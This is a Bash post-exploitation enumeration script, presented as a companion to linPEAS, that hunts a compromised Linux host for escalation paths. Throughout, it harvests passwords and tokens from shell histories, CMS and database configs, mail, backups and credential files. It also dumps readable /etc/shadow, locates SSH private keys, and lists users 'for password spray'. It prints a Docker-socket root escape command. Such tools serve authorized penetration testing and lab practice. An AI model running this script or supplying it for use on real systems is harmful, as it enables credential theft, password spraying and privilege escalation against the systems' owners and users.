#!/bin/bash
# =============================================================================
# linux-korek.sh - linPEAS Gap Filler
# Run AFTER linpeas.sh for complete Linux coverage
# Author: korek
# =============================================================================
# Usage:
#   chmod +x linux-korek.sh
#   ./linux-korek.sh
#   ./linux-korek.sh | tee korek_out.txt
# =============================================================================

R='\033[0;31m'
G='\033[0;32m'
Y='\033[0;33m'
C='\033[0;36m'
W='\033[1;37m'
N='\033[0m'

hit()  { echo -e "${G}[+]${N} $1"; }
info() { echo -e "    ${W}>>>${N} $1"; }
sec()  { echo -e "\n${C}[*] ========== $1 ==========${N}"; }
warn() { echo -e "${Y}[!]${N} $1"; }
hot()  { echo -e "${R}[!!]${N} $1"; }

echo -e "${C}============================================================${N}"
echo -e "${C}  linux-korek.sh - linPEAS Gap Filler${N}"
echo -e "${C}  Run this AFTER linpeas for complete coverage${N}"
echo -e "${C}  $(date)${N}"
echo -e "${C}============================================================${N}"

# ==========================================================================
# 1. Shell history - grep for credentials
# ==========================================================================
sec "SHELL HISTORY CREDENTIAL GREP"
for histfile in ~/.bash_history ~/.zsh_history ~/.sh_history ~/.history \
                /home/*/.bash_history /home/*/.zsh_history /root/.bash_history; do
    [ -f "$histfile" ] 2>/dev/null || continue
    hits=$(grep -iE "(pass|passwd|password|pwd|secret|key|token|api|credential|curl.*-u|curl.*--user|mysql.*-p|psql.*-U|sshpass)" \
           "$histfile" 2>/dev/null | grep -v "^#")
    if [ -n "$hits" ]; then
        hit "History creds in: $histfile"
        echo "$hits" | head -20 | while read line; do info "$line"; done
    fi
done

# ==========================================================================
# 2. UNUSUAL FILES - The main new section
# ==========================================================================
sec "UNUSUAL / NON-DEFAULT FILES"

# --- 2a. Archive/backup files anywhere on system ---
echo -e "${Y}--- Archive & Backup Files ---${N}"
find / -maxdepth 8 \( \
    -name "*.zip" -o -name "*.tar" -o -name "*.tar.gz" -o -name "*.tgz" -o \
    -name "*.tar.bz2" -o -name "*.tar.xz" -o -name "*.7z" -o -name "*.rar" -o \
    -name "*.gz" -o -name "*.bz2" -o -name "*.xz" \
\) -type f -readable 2>/dev/null | \
grep -vE "(/usr/share/doc|/usr/share/man|/usr/lib|/snap|/proc|linux-korek)" | \
while read f; do
    size=$(du -sh "$f" 2>/dev/null | cut -f1)
    hot "Archive found: $f ($size)"
    # peek inside zip/tar
    case "$f" in
        *.zip) zipinfo -1 "$f" 2>/dev/null | grep -iE "(pass|config|shadow|\.sql|\.conf|\.php|\.key|\.pem)" | head -5 | while read line; do info "  contains: $line"; done ;;
        *.tar*|*.tgz) tar -tf "$f" 2>/dev/null | grep -iE "(pass|config|shadow|\.sql|\.conf|\.php|\.key|\.pem)" | head -5 | while read line; do info "  contains: $line"; done ;;
    esac
done

# --- 2b. Database dumps ---
echo -e "\n${Y}--- Database Dump Files ---${N}"
find / -maxdepth 8 \( \
    -name "*.sql" -o -name "*.dump" -o -name "*.sqlite" -o -name "*.sqlite3" -o \
    -name "*.db" -o -name "*.mdb" \
\) -type f -readable 2>/dev/null | \
grep -vE "(/usr/share|/usr/lib|/snap|linux-korek)" | \
while read f; do
    size=$(du -sh "$f" 2>/dev/null | cut -f1)
    hot "DB file: $f ($size)"
    # grep for passwords in sql dumps
    grep -iE "(INSERT.*pass|password.*=|CREATE USER)" "$f" 2>/dev/null | head -5 | while read line; do info "$line"; done
done

# --- 2c. Files not owned by system packages (unique/custom files) ---
echo -e "\n${Y}--- Custom/Non-Package Files in System Dirs ---${N}"
# Check /opt, /srv, /var/www, /var/backup, /backup, /data
for sysdir in /opt /srv /backup /data /var/backup /mnt /media; do
    if [ -d "$sysdir" ] 2>/dev/null; then
        files=$(find "$sysdir" -type f -readable 2>/dev/null | grep -vE "linux-korek")
        if [ -n "$files" ]; then
            hit "Files in $sysdir:"
            echo "$files" | while read f; do
                size=$(du -sh "$f" 2>/dev/null | cut -f1)
                info "$f ($size)"
            done
        fi
    fi
done

# --- 2d. Executables in home directories ---
echo -e "\n${Y}--- Executables/Scripts in Home Dirs ---${N}"
find /home /root -maxdepth 3 \( \
    -name "*.sh" -o -name "*.py" -o -name "*.pl" -o -name "*.rb" -o \
    -name "*.exe" -o -name "*.elf" -o -perm /111 \
\) -type f -readable 2>/dev/null | \
grep -vE "linux-korek" | \
while read f; do
    hit "Script/exec in home: $f"
    # grep first 5 lines for clues
    head -3 "$f" 2>/dev/null | while read line; do info "$line"; done
done

# --- 2e. Hidden files and directories in unexpected places ---
echo -e "\n${Y}--- Hidden Files in Non-Home Locations ---${N}"
find /opt /srv /var/www /tmp /var/tmp -maxdepth 5 -name ".*" -type f -readable 2>/dev/null | \
grep -vE "linux-korek" | \
while read f; do
    size=$(du -sh "$f" 2>/dev/null | cut -f1)
    hit "Hidden file: $f ($size)"
    # check if it contains creds
    hits=$(grep -iE "(pass|secret|key|token|user)" "$f" 2>/dev/null | head -3)
    [ -n "$hits" ] && echo "$hits" | while read line; do info "$line"; done
done

# --- 2f. Large files in /tmp or /var/tmp (unusual data) ---
echo -e "\n${Y}--- Large Files in Temp Dirs ---${N}"
find /tmp /var/tmp -type f -size +1M -readable 2>/dev/null | while read f; do
    size=$(du -sh "$f" 2>/dev/null | cut -f1)
    warn "Large temp file: $f ($size)"
done

# --- 2g. Files modified in last 24h in web/app directories ---
echo -e "\n${Y}--- Recently Modified Files in Web/App Dirs (24h) ---${N}"
find /var/www /opt /srv -maxdepth 8 -newer /tmp -type f -readable 2>/dev/null | \
grep -vE "(linux-korek|\.log$|cache)" | \
while read f; do
    warn "Recently modified: $f"
done

# --- 2h. World-writable files outside /tmp ---
echo -e "\n${Y}--- World-Writable Files (excluding /tmp) ---${N}"
find / -maxdepth 6 -perm -0002 -type f -readable 2>/dev/null | \
grep -vE "(/tmp|/var/tmp|/proc|/sys|/dev|linux-korek)" | \
while read f; do
    warn "World-writable: $f"
done

# --- 2i. SUID binaries not in package manager ---
echo -e "\n${Y}--- SUID Binaries Not in Package Manager ---${N}"
find / -maxdepth 8 -perm -4000 -type f 2>/dev/null | while read f; do
    # check if known to dpkg/rpm
    if command -v dpkg >/dev/null 2>&1; then
        if ! dpkg -S "$f" >/dev/null 2>&1; then
            hot "SUID not in dpkg: $f"
            ls -la "$f" 2>/dev/null | while read line; do info "$line"; done
        fi
    elif command -v rpm >/dev/null 2>&1; then
        if ! rpm -qf "$f" >/dev/null 2>&1; then
            hot "SUID not in rpm: $f"
            ls -la "$f" 2>/dev/null | while read line; do info "$line"; done
        fi
    fi
done

# ==========================================================================
# 3. Backup and temp files with sensitive names
# ==========================================================================
sec "BACKUP / OLD / TEMP SENSITIVE FILES"
find / -maxdepth 8 \( \
    -name "*.bak" -o -name "*.old" -o -name "*.backup" -o \
    -name "*.orig" -o -name "*.save" -o -name "*.swp" -o \
    -name "*~" -o -name "*.tmp" \
\) -type f -readable 2>/dev/null | \
grep -iE "(pass|secret|cred|shadow|key|config|auth)" | \
grep -vE "(/usr/share|/usr/lib|/snap|linux-korek)" | \
while read f; do
    size=$(stat -c%s "$f" 2>/dev/null)
    hit "Backup file: $f ($size bytes)"
    grep -iE "(pass|password|secret|key|token|user)" "$f" 2>/dev/null | head -5 | while read line; do
        info "$line"
    done
done

# ==========================================================================
# 4. Joomla / WordPress / CMS config files
# ==========================================================================
sec "CMS CONFIG FILES"
for f in \
    /var/www/html/configuration.php \
    /var/www/html/cms/configuration.php \
    /var/www/*/configuration.php \
    /var/www/html/wp-config.php \
    /var/www/*/wp-config.php \
    /srv/*/configuration.php \
    /srv/*/wp-config.php; do
    [ -f "$f" ] 2>/dev/null || continue
    hot "CMS config: $f"
    grep -iE "(\\\$db|\\\$user|\\\$pass|password|secret|host)" "$f" 2>/dev/null | \
        grep -v "^//" | grep -v "^#" | head -15 | while read line; do info "$line"; done
done

# ==========================================================================
# 5. Database credential files
# ==========================================================================
sec "DATABASE CREDENTIAL FILES"
for f in ~/.my.cnf ~/.pgpass ~/.dbpass /etc/mysql/debian.cnf \
          /root/.my.cnf /home/*/.my.cnf; do
    [ -f "$f" ] 2>/dev/null || continue
    hit "DB config: $f"
    grep -iE "(pass|password|db_|user|host)" "$f" 2>/dev/null | \
        grep -v "^#\|^//" | head -10 | while read line; do info "$line"; done
done

# ==========================================================================
# 6. Config files with passwords
# ==========================================================================
sec "CONFIG FILES WITH CREDENTIALS"
for f in /etc/ftp*.conf /etc/vsftpd.conf /etc/pure-ftpd/db/*.conf \
         /etc/proftpd/proftpd.conf /etc/openldap/ldap.conf /etc/ldap/ldap.conf \
         /etc/gitlab/gitlab.rb /etc/nagios/*.cfg /etc/nagios3/*.cfg \
         /etc/zabbix/zabbix_server.conf /etc/roundcube/config.inc.php \
         /etc/phpmyadmin/config.inc.php /var/lib/phpmyadmin/config.inc.php; do
    [ -f "$f" ] 2>/dev/null || continue
    hits=$(grep -iE "(pass|password|secret|credential)" "$f" 2>/dev/null | grep -v "^#\|^;")
    if [ -n "$hits" ]; then
        hit "Creds in config: $f"
        echo "$hits" | head -5 | while read line; do info "$line"; done
    fi
done

# ==========================================================================
# 7. SSH keys in non-standard locations
# ==========================================================================
sec "SSH PRIVATE KEYS (ALL LOCATIONS)"
find / -maxdepth 8 \( \
    -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o \
    -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" \
\) -type f -readable 2>/dev/null | \
grep -vE "(/usr/share|/usr/lib|/snap|linux-korek)" | \
while read f; do
    if head -1 "$f" 2>/dev/null | grep -q "PRIVATE"; then
        hot "SSH Private Key: $f"
        ls -la "$f" 2>/dev/null | while read line; do info "$line"; done
    fi
done

# ==========================================================================
# 8. Recently modified files (last 10 min)
# ==========================================================================
sec "RECENTLY MODIFIED FILES (last 10 min)"
find / -maxdepth 6 -newer /tmp -type f -readable 2>/dev/null | \
grep -vE "(/proc/|/sys/|/dev/|linux-korek|\.log$|journal)" | head -20 | \
while read f; do
    hit "Recently modified: $f"
done

# ==========================================================================
# 9. Mail / inbox files
# ==========================================================================
sec "MAIL / INBOX FILES"
for maildir in /var/mail /var/spool/mail /home/*/.mail /root/mail; do
    find "$maildir" -type f -readable 2>/dev/null | while read f; do
        size=$(stat -c%s "$f" 2>/dev/null)
        if [ "$size" -gt 0 ] 2>/dev/null; then
            hit "Mail file: $f ($size bytes)"
            grep -iE "(pass|password|secret|key|credential)" "$f" 2>/dev/null | \
                head -5 | while read line; do info "$line"; done
        fi
    done
done

# ==========================================================================
# 10. Writable cron directories
# ==========================================================================
sec "WRITABLE CRON PATHS"
for cronpath in /etc/cron.d /etc/cron.daily /etc/cron.hourly \
                /etc/cron.weekly /etc/cron.monthly /var/spool/cron; do
    if [ -w "$cronpath" ] 2>/dev/null; then
        hot "WRITABLE cron directory: $cronpath"
    fi
done
find /etc/cron* /var/spool/cron -type f 2>/dev/null | while read f; do
    if [ -w "$f" ] 2>/dev/null; then
        hot "WRITABLE cron file: $f"
        cat "$f" 2>/dev/null | while read line; do info "$line"; done
    fi
done

# ==========================================================================
# 11. Tmux / Screen sessions
# ==========================================================================
sec "TMUX / SCREEN SESSIONS"
tmux list-sessions 2>/dev/null | while read line; do
    hit "tmux session: $line"
done
find /tmp -name "tmux-*" 2>/dev/null | while read f; do
    hit "tmux socket: $f"
done
screen -list 2>/dev/null | grep -v "^$\|Sockets\|There is\|There are\|No Sockets" | while read line; do
    hit "screen session: $line"
done

# ==========================================================================
# 12. Container escape checks
# ==========================================================================
sec "CONTAINER ESCAPE CHECKS"
if [ -w /var/run/docker.sock ] 2>/dev/null; then
    hot "DOCKER SOCKET IS WRITABLE - escape possible!"
    info "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
fi
if [ -f /.dockerenv ]; then
    warn "Running inside Docker container"
    if cat /proc/self/status 2>/dev/null | grep -q "CapEff.*0000003fffffffff\|CapEff.*ffff"; then
        hot "PRIVILEGED CONTAINER - escape possible!"
    fi
fi
if grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    warn "Container indicators in cgroup"
fi

# ==========================================================================
# 13. App credential files (.netrc, .boto, secrets)
# ==========================================================================
sec "APP CREDENTIAL FILES"
find /home /root /opt -maxdepth 4 \( \
    -name ".netrc" -o -name ".boto" -o -name ".s3cfg" -o \
    -name "secrets.py" -o -name "local_settings.py" \
\) -readable 2>/dev/null | while read f; do
    hit "App creds: $f"
    cat "$f" 2>/dev/null | grep -iE "(pass|secret|key|token)" | head -5 | while read line; do info "$line"; done
done

# ==========================================================================
# 14. Local users + password spray targets
# ==========================================================================
sec "LOCAL USERS (for password spray)"
cat /etc/passwd | grep -vE "(nologin|false|sync|halt|shutdown)" | \
    awk -F: '$3 >= 1000 || $3 == 0 {print $1" (uid:"$3" shell:"$7}' | \
    while read line; do info "$line"; done

# ==========================================================================
# 15. Dangerous capabilities
# ==========================================================================
sec "DANGEROUS CAPABILITIES"
getcap -r / 2>/dev/null | grep -vE "(ping|mtr-packet)" | \
grep -E "(cap_setuid|cap_net_raw|cap_dac_override|cap_sys_admin|cap_sys_ptrace|cap_chown|cap_fowner)" | \
while read line; do
    hot "Dangerous capability: $line"
done

# ==========================================================================
# 16. Readable shadow or shadow backups
# ==========================================================================
sec "SHADOW FILE ACCESS"
if [ -r /etc/shadow ] 2>/dev/null; then
    hot "READABLE /etc/shadow!"
    cat /etc/shadow | grep -v "^[^:]*:[!*]" | head -20
fi
for f in /etc/shadow- /etc/shadow.bak /var/shadow /backup/shadow; do
    if [ -r "$f" ] 2>/dev/null; then
        hot "Readable shadow backup: $f"
        cat "$f" 2>/dev/null | head -10 | while read line; do info "$line"; done
    fi
done

# ==========================================================================
# 17. NFS no_root_squash
# ==========================================================================
sec "NFS NO_ROOT_SQUASH"
if [ -r /etc/exports ] 2>/dev/null; then
    grep "no_root_squash" /etc/exports 2>/dev/null | while read line; do
        hot "NFS no_root_squash: $line"
    done
fi

echo -e "\n${G}[+] linux-korek.sh complete! Review [!!] HOT items first, then [!] warnings.${N}"
